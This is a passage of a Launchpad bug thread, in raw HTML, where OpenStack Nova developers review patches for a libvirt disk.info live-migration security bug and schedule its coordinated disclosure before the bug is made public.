     <textarea style="width: 100%" rows="10">2016-03-09 works for me, but I feel we could even go sooner than that assuming we get the pre-approval. What's the schedule like?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/47" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-02T13:45:58.333478+00:00" title="2016-03-02 13:45:58 UTC">on 2016-03-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/47"> #47</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Matthew, if the pre-OSSA is sent between Monday and Thursday, we could disclose the next Tuesday.<br />
And if it&#x27;s sent early on Friday, it can be disclosed next Wednesday.<br />
Finally, if it&#x27;s sent late Friday or early enough Monday, it can be disclosed the next Thursday.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Matthew, if the pre-OSSA is sent between Monday and Thursday, we could disclose the next Tuesday.
And if it's sent early on Friday, it can be disclosed next Wednesday.
Finally, if it's sent late Friday or early enough Monday, it can be disclosed the next Thursday.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/48" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~alaski" class="sprite person">Andrew Laski (alaski)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-02T19:20:25.043824+00:00" title="2016-03-02 19:20:25 UTC">on 2016-03-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/48"> #48</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I will echo what was said by Dan and I previously: it would be preferable to recreate disk.info rather than copy it because in an upgrade scenario if the format changes you may be copying a format that the destination compute does not understand. If this was not a security fix I would hold on that point until we could reach a consensus on the approach. However I will just note my disagreement with the approach here but say that the patch looks good to me for addressing the bug.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I will echo what was said by Dan and I previously: it would be preferable to recreate disk.info rather than copy it because in an upgrade scenario if the format changes you may be copying a format that the destination compute does not understand. If this was not a security fix I would hold on that point until we could reach a consensus on the approach. However I will just note my disagreement with the approach here but say that the patch looks good to me for addressing the bug.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/49" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-02T20:21:52.966452+00:00" title="2016-03-02 20:21:52 UTC">on 2016-03-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/49"> #49</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thank you Andrew for reading through this, is the disk.info format changed between kilo and mitaka release ? If there are no foreseeable upgrade breakage, then I would prefer we fix the immediate issue and put that &quot;disk.info rewrite&quot; story on top of nova backlog.</p>
<p>So if that&#x27;s ok with you, let&#x27;s send the pre-OSSA today with a disclosure date set to:<br />
2016-03-08, 1500 UTC</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thank you Andrew for reading through this, is the disk.info format changed between kilo and mitaka release ? If there are no foreseeable upgrade breakage, then I would prefer we fix the immediate issue and put that "disk.info rewrite" story on top of nova backlog.

So if that's ok with you, let's send the pre-OSSA today with a disclosure date set to:
2016-03-08, 1500 UTC</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/50" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~alaski" class="sprite person">Andrew Laski (alaski)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-02T20:38:17.289235+00:00" title="2016-03-02 20:38:17 UTC">on 2016-03-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/50"> #50</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>No, the disk.info format has not changed and there is no foreseeable upgrade breakage. The copy is just something that may need to be changed to a recreate later if there are plans to update disk.info at some point.</p>
<p>I&#x27;m okay with moving forward with this.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">No, the disk.info format has not changed and there is no foreseeable upgrade breakage. The copy is just something that may need to be changed to a recreate later if there are plans to update disk.info at some point.

I'm okay with moving forward with this.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2016-03-02 21:24:11 UTC" datetime="2016-03-02T21:24:11.237000+00:00">on 2016-03-02</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Committed
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/51" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-04T15:05:39.476176+00:00" title="2016-03-04 15:05:39 UTC">on 2016-03-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/51"> #51</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/nova/+bug/1548450/+attachment/4588377/+files/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch">0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch</a>
        <a class="sprite edit action-icon" href="/nova/+bug/1548450/+attachment/4588377">Edit</a>
        (8.2 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/52" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-04T15:05:52.737553+00:00" title="2016-03-04 15:05:52 UTC">on 2016-03-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/52"> #52</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/nova/+bug/1548450/+attachment/4588378/+files/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch">0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch</a>
        <a class="sprite edit action-icon" href="/nova/+bug/1548450/+attachment/4588378">Edit</a>
        (8.2 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/53" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-04T15:06:09.324092+00:00" title="2016-03-04 15:06:09 UTC">on 2016-03-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/53"> #53</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/nova/+bug/1548450/+attachment/4588379/+files/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch">0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch</a>
        <a class="sprite edit action-icon" href="/nova/+bug/1548450/+attachment/4588379">Edit</a>
        (8.3 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/54" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-04T15:10:51.588821+00:00" title="2016-03-04 15:10:51 UTC">on 2016-03-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/54"> #54</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>After additional code review from mbooth I&#x27;ve updated the attached patches. The only change made is to move the disk_info recreation logic within pre_live_migration out of the `if not is_shared_<wbr />block_storage` block. This is to avoid any potential future issues with disk_info not being recreated if an imagebackend is added that uses shared block storage but still uses disk.info.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">After additional code review from mbooth I've updated the attached patches. The only change made is to move the disk_info recreation logic within pre_live_migration out of the `if not is_shared_block_storage` block. This is to avoid any potential future issues with disk_info not being recreated if an imagebackend is added that uses shared block storage but still uses disk.info.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/55" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-04T19:45:39.051219+00:00" title="2016-03-04 19:45:39 UTC">on 2016-03-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/55"> #55</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thank you Lee for the update, I confirm the new patchs succeed py27 and pep8 tests.</p>
<p>Andrew (or another Nova core), could you please have a look and pre-approve those new version ?</p>
<p>Since the previous patchs have already been shared with the stakeholder list, we&#x27;ll have to follow-up with the new version and probably extend the disclosure date.</p>
<p>If this can be done by early Monday, the new disclosure date would be: 2016-03-10, 1500UTC<br />
Otherwise, the earliest disclosure date would be: 2016-03-15, 1500UTC</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thank you Lee for the update, I confirm the new patchs succeed py27 and pep8 tests.

Andrew (or another Nova core), could you please have a look and pre-approve those new version ?

Since the previous patchs have already been shared with the stakeholder list, we'll have to follow-up with the new version and probably extend the disclosure date.

If this can be done by early Monday, the new disclosure date would be: 2016-03-10, 1500UTC
Otherwise, the earliest disclosure date would be: 2016-03-15, 1500UTC</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/56" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~alaski" class="sprite person">Andrew Laski (alaski)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-07T13:57:47.281284+00:00" title="2016-03-07 13:57:47 UTC">on 2016-03-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/56"> #56</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The new patches look good to me. I would prefer if there was a second reviewer on these who is more familiar with the libvirt driver than I am but I&#x27;m +1 on them.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The new patches look good to me. I would prefer if there was a second reviewer on these who is more familiar with the libvirt driver than I am but I'm +1 on them.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/57" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-08T14:52:43.680313+00:00" title="2016-03-08 14:52:43 UTC">on 2016-03-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/57"> #57</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Since the former patch are still correct, let&#x27;s proceed with the original plan and open this bug in 10 minutes.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Since the former patch are still correct, let's proceed with the original plan and open this bug in 10 minutes.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2016-03-08 15:00:18 UTC" datetime="2016-03-08T15:00:18.405843+00:00">on 2016-03-08</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Private Security &#8594; Public
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/58" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-08T15:02:16.214689+00:00" title="2016-03-08 15:02:16 UTC">on 2016-03-08</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/58">
                <strong>Fix proposed to nova (master)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/58"> #58</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: master<br />
Review: <a rel="nofollow" href="https://review.openstack.org/289957">https:/<wbr />/review.<wbr />openstack.<wbr />org/289957</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: master
Review: https://review.openstack.org/289957</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in nova: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>assignee</b>:
      </td>
      <td>
        nobody &#8594; Lee Yarwood (lyarwood)
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; In Progress
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/59" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-03-08T15:03:53.347630+00:00" title="2016-03-08 15:03:53 UTC">on 2016-03-08</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/1548450/comments/59">
                <strong>Fix proposed to nova (stable/liberty)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/59"> #59</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: stable/liberty<br />
Review: <a rel="nofollow" href="https://review.openstack.org/289958">https:/<wbr />/review.<wbr />openstack.<wbr />org/289958</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: stable/liberty
Review: https://review.openstack.org/289958</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2016-03-08 15:05:52 UTC" datetime="2016-03-08T15:05:52.169041+00:00">on 2016-03-08</time>
  </div>
